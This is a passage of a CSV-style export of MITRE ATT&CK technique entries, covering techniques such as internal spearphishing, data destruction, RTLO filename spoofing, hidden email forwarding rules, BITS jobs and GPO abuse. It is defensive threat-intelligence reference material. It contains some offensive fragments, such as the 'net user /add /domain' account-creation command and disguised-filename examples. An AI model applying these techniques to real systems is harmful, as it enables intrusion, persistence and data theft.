* App Switcher: <code>C:\Windows\System32\AtBroker.exe</code>",Windows,FALSE,FALSE,2020-01-24T14:32:40Z
attack-pattern--9e7452df-5144-4b6e-b04a-b66dd4016747,6,T1534,Internal Spearphishing,"After they already have access to accounts or systems within the environment, adversaries may use internal spearphishing to gain access to additional information or compromise other users within the same organization. Internal spearphishing is multi-staged campaign where a legitimate account is initially compromised either by controlling the user's device or by compromising the account credentials of the user. Adversaries may then attempt to take advantage of the trusted internal account to increase the likelihood of tricking more victims into falling for phish attempts, often incorporating [Impersonation](https://attack.mitre.org/techniques/T1684/001).(Citation: Trend Micro - Int SP)

For example, adversaries may leverage [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) or [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through [Input Capture](https://attack.mitre.org/techniques/T1056) on sites that mimic login interfaces.

Adversaries may also leverage internal chat apps, such as Microsoft Teams, to spread malicious content or engage users in attempts to capture sensitive information and/or credentials.(Citation: Int SP - chat apps)","Linux, macOS, Office Suite, SaaS, Windows",FALSE,FALSE,2019-09-04T19:26:12Z
attack-pattern--a0e6614a-7740-4b24-bd65-f1bde09fc365,6,T1593,Search Open Websites/Domains,"Adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts.(Citation: Cyware Social Media)(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)

Adversaries may search in different online sites depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Phishing](https://attack.mitre.org/techniques/T1566)).",PRE,FALSE,FALSE,2020-10-02T16:48:04Z
attack-pattern--bd5b58a4-a52d-4a29-bc0d-3f1d3968eb6b,6,T1036.003,Rename Legitimate Utilities,"Adversaries may rename legitimate / system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for legitimate utilities adversaries are capable of abusing, including both built-in binaries and tools such as PSExec, AutoHotKey, and IronPython.(Citation: LOLBAS Main Site)(Citation: Huntress Python Malware 2025)(Citation: The DFIR Report AutoHotKey 2023)(Citation: Splunk Detect Renamed PSExec) It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe</code>).(Citation: Elastic Masquerade Ball) An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on these utilities executing from non-standard paths.(Citation: F-Secure CozyDuke)","Linux, macOS, Windows",FALSE,FALSE,2020-02-10T20:03:11Z
attack-pattern--d45a3d09-b3cf-48f4-9f0f-f521ee5cb05c,6,T1485,Data Destruction,"Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.

Adversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)

To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018).

In cloud environments, adversaries may leverage access to delete cloud storage objects, machine images, database instances, and other infrastructure crucial to operations to damage an organization or their customers.(Citation: Data Destruction - Threat Post)(Citation: DOJ  - Cisco Insider) Similarly, they may delete virtual machines from on-prem virtualized environments.","Containers, ESXi, IaaS, Linux, macOS, Windows",FALSE,FALSE,2019-03-14T18:47:17Z
attack-pattern--f7827069-0bf2-4764-af4f-23fae0d181b7,6,T1102.001,Dead Drop Resolver,"Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.

Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.

Use of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).","ESXi, Linux, macOS, Windows",FALSE,FALSE,2020-03-14T22:24:21Z
attack-pattern--f9cc4d06-775f-4ee1-b401-4e2cc0da30ba,6,T1584.001,Domains,"Adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant.(Citation: ICANNDomainNameHijacking) Adversaries may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account, taking advantage of renewal process gaps, or compromising a cloud service that enables managing domains (e.g., AWS Route53).(Citation: Krebs DNS Hijack 2019)

Subdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.(Citation: Microsoft Sub Takeover 2020)

Adversaries who compromise a domain may also engage in domain shadowing by creating malicious subdomains under their control while keeping any existing DNS records. As service will not be disrupted, the malicious subdomains may go unnoticed for long periods of time.(Citation: Palo Alto Unit 42 Domain Shadowing 2022)",PRE,FALSE,FALSE,2020-10-01T00:51:28Z
attack-pattern--246fd3c7-f5e3-466d-8787-4c13d9e3b61c,5,T1080,Taint Shared Content,"
Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.

A directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1547/009) of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real directories, which are hidden through [Hidden Files and Directories](https://attack.mitre.org/techniques/T1564/001). The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. (Citation: Retwin Directory Share Pivot)

Adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.","Windows, SaaS, Linux, macOS, Office Suite",FALSE,FALSE,2017-05-31T21:31:01Z
attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7,5,T1530,Data from Cloud Storage,"Adversaries may access data from cloud storage.

Many IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. 

In some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). 

Adversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.

This open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)

Adversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.","IaaS, Office Suite, SaaS",FALSE,FALSE,2019-08-30T18:07:27Z
attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6,5,T1071,Application Layer Protocol,"Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, DNS, or publishing/subscribing. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.(Citation: Mandiant APT29 Eye Spy Email Nov 22)","Linux, macOS, Windows, Network Devices, ESXi",FALSE,FALSE,2017-05-31T21:30:56Z
attack-pattern--5d2be8b9-d24c-4e98-83bf-2f5f79477163,5,T1484.001,Group Policy Modification,"Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path `\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) 

Like other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.

Malicious GPO modifications can be used to implement many other malicious behaviors such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Disable or Modify Tools](https://attack.mitre.org/techniques/T1685), [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1569/002),  and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs)

For example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml</code>.(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)",Windows,FALSE,FALSE,2020-12-28T21:50:59Z
attack-pattern--60d0c01d-e2bf-49dd-a453-f8a9c9fa6f65,5,T1021.006,Windows Remote Management,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.

WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).(Citation: Microsoft WinRM) It may be called with the `winrm` command or by any number of programs such as PowerShell.(Citation: Jacobsen 2014) WinRM  can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).(Citation: MSDN WMI)",Windows,FALSE,FALSE,2020-02-11T18:29:47Z
attack-pattern--7610cada-1499-41a4-b3dd-46467b68d177,5,T1136.002,Domain Account,"Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.(Citation: Savill 1999)

Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.","Linux, macOS, Windows",FALSE,FALSE,2020-01-28T14:05:17Z
attack-pattern--77eae145-55db-4519-8ae5-77b0c7215d69,5,T1036.002,Right-to-Left Override,"Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named <code>March 25 \u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>.(Citation: Infosecinstitute RTLO Technique)

Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)/[Malicious File](https://attack.mitre.org/techniques/T1204/002) since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.","Linux, macOS, Windows",FALSE,FALSE,2020-02-10T19:55:29Z
attack-pattern--7d77a07d-02fe-4e88-8bd9-e9c008c01bf0,5,T1114.003,Email Forwarding Rule,"Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations.(Citation: US-CERT TA18-068A 2018) Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators.(Citation: Pfammatter - Hidden Inbox Rules) Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)(Citation: Mac Forwarding Rules)

Any user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.(Citation: Pfammatter - Hidden Inbox Rules)

In some environments, administrators may be able to enable email forwarding rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to enable forwarding on all or specific mail an organization receives.","Linux, macOS, Office Suite, Windows",FALSE,FALSE,2020-02-19T18:54:47Z
attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e,5,T1074,Data Staged,"Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.(Citation: PWC Cloud Hopper April 2017)

In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)

Adversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.","ESXi, IaaS, Linux, macOS, Windows",FALSE,FALSE,2017-05-31T21:30:58Z
attack-pattern--810d8072-afb6-4a56-9ee7-86379ac4a6f3,5,T1584.005,Botnet,"Adversaries may compromise numerous third-party systems to form a botnet that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Instead of purchasing/renting a botnet from a booter/stresser service, adversaries may build their own botnet by compromising numerous third-party systems.(Citation: Imperva DDoS for Hire) Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers.(Citation: Dell Dridex Oct 2015) With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).",PRE,FALSE,FALSE,2020-10-01T00:58:35Z
attack-pattern--866d0d6d-02c6-42bd-aa2f-02907fdc0969,5,T1654,Log Enumeration,"Adversaries may enumerate system and service logs to find useful data. These logs may highlight various types of valuable insights for an adversary, such as user authentication records ([Account Discovery](https://attack.mitre.org/techniques/T1087)), security or vulnerable software ([Software Discovery](https://attack.mitre.org/techniques/T1518)), or hosts within a compromised network ([Remote System Discovery](https://attack.mitre.org/techniques/T1018)).

Host binaries may be leveraged to collect system logs. Examples include using `wevtutil.exe` or [PowerShell](https://attack.mitre.org/techniques/T1059/001) on Windows to access and/or export security event information.(Citation: WithSecure Lazarus-NoPineapple Threat Intel Report 2023)(Citation: Cadet Blizzard emerges as novel threat actor) In cloud environments, adversaries may leverage utilities such as the Azure VM Agent’s `CollectGuestLogs.exe` to collect security logs from cloud hosted infrastructure.(Citation: SIM Swapping and Abuse of the Microsoft Azure Serial Console)

Adversaries may also target centralized logging infrastructure such as SIEMs. Logs may also be bulk exported and sent to adversary-controlled infrastructure for offline analysis.

In addition to gaining a better understanding of the environment, adversaries may also monitor logs in real time to track incident response procedures. This may allow them to adjust their techniques in order to maintain persistence or evade defenses.(Citation: Permiso GUI-Vil 2023)","ESXi, IaaS, Linux, macOS, Windows",FALSE,FALSE,2023-07-10T16:50:57Z
attack-pattern--9a60a291-8960-4387-8a4a-2ab5c18bb50b,5,T1071.002,File Transfer Protocols,"Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

Protocols such as SMB(Citation: US-CERT TA18-074A), FTP(Citation: ESET Machete July 2019), FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.","ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2020-03-15T16:16:25Z
attack-pattern--a6937325-9321-4e2e-bb2b-3ed2d40b2a9d,5,T1218.001,Compiled HTML File,"Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)

A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)",Windows,FALSE,FALSE,2020-01-23T18:53:54Z
attack-pattern--bc76d0a4-db11-4551-9ac4-01a469cfb161,5,T1589.001,Credentials,"Adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts.

Adversaries may gather credentials from potential victims in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then add malicious content designed to collect website authentication cookies from visitors.(Citation: ATT ScanBox) (Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks) Where multi-factor authentication (MFA) based on out-of-band communications is in use, adversaries may compromise a service provider to gain access to MFA codes and one-time passwords (OTP).(Citation: Okta Scatter Swine 2022)

Credential information may also be exposed to adversaries via leaks to online or other accessible data sets (ex: [Search Engines](https://attack.mitre.org/techniques/T1593/002), breach dumps, code repositories, etc.). Adversaries may purchase credentials from dark web markets, such as Russian Market and 2easy, or through access to Telegram channels that distribute logs from infostealer malware.(Citation: Bleeping Computer 2easy 2021)(Citation: SecureWorks Infostealers 2023)(Citation: Bleeping Computer Stealer Logs 2023)

Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",PRE,FALSE,FALSE,2020-10-02T14:55:43Z
attack-pattern--c1b68a96-3c48-49ea-a6c0-9b27359f9c19,5,T1614.001,System Language Discovery,"Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.(Citation: Malware System Language Check)

There are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Query Registry](https://attack.mitre.org/techniques/T1012) and calls to [Native API](https://attack.mitre.org/techniques/T1106) functions.(Citation: CrowdStrike Ryuk January 2019) 

For example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language</code> or parsing the outputs of Windows API functions <code>GetUserDefaultUILanguage</code>, <code>GetSystemDefaultUILanguage</code>, <code>GetKeyboardLayoutList</code> and <code>GetUserDefaultLangID</code>.(Citation: Darkside Ransomware Cybereason)(Citation: Securelist JSWorm)(Citation: SecureList SynAck Doppelgänging May 2018)

On a macOS or Linux system, adversaries may query <code>locale</code> to retrieve the value of the <code>$LANG</code> environment variable.","Linux, macOS, Windows",FALSE,FALSE,2021-08-18T14:06:45Z
attack-pattern--c3888c54-775d-4b2f-b759-75a2ececcbfd,5,T1030,Data Transfer Size Limits,An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.,"Linux, macOS, Windows, ESXi",FALSE,FALSE,2017-05-31T21:30:34Z
attack-pattern--c8e87b83-edbb-48d4-9295-4974897525b7,5,T1197,BITS Jobs,"Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation: Microsoft COM)(Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.

The interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool.(Citation: Microsoft BITS)(Citation: Microsoft BITSAdmin)

Adversaries may abuse BITS to download (e.g. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)), execute, and even clean up after running malicious code (e.g. [Indicator Removal](https://attack.mitre.org/techniques/T1070)). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.(Citation: CTU BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS May 2007)(Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).(Citation: PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware June 2016)

BITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).(Citation: CTU BITS Malware June 2016)",Windows,FALSE,FALSE,2018-04-18T17:59:24Z
attack-pattern--cca0ccb6-a068-4574-a722-b1556f86833a,5,T1598,Phishing for Information,"Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from [Phishing](https://attack.mitre.org/techniques/T1566) in that the objective is gathering data from the victim rather than executing malicious code.

All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.

Adversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means.(Citation: ThreatPost Social Media Phishing)(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin)(Citation: Sophos Attachment)(Citation: GitHub Phishery) Victims may also receive phishing messages that direct them to call a phone number where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing)

Phishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages. Another way to accomplish this is by [Email Spoofing](https://attack.mitre.org/techniques/T1684/002)(Citation: Proofpoint-spoof) the identity of the sender, which can be used to fool both the human recipient as well as automated security tools.(Citation: cyberproof-double-bounce) 

Phishing for information may also involve evasive techniques, such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014)",PRE,FALSE,FALSE,2020-10-02T17:07:01Z
attack-pattern--cdfc5f0a-9bb9-4352-b896-553cfa2d8fd8,5,T1585,Establish Accounts,"Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)

For operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)

Establishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1) In addition, establishing accounts may allow adversaries to abuse free services, such as registering for trial periods to [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) for malicious purposes.(Citation: Free Trial PurpleUrchin)
",PRE,FALSE,FALSE,2020-10-01T01:05:42Z
attack-pattern--f24faf46-3b26-4dbb-98f2-63460498e433,5,T1008,Fallback Channels,Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.,"ESXi, Linux, macOS, Windows",FALSE,FALSE,2017-05-31T21:30:21Z
attack-pattern--01327cde-66c4-4123-bf34-5f258d59457b,4,T1021.005,VNC,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (“remote framebuffer”) protocol to enable users to remotely control another computer’s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation: The Remote Framebuffer Protocol)

VNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation: VNC Authentication)

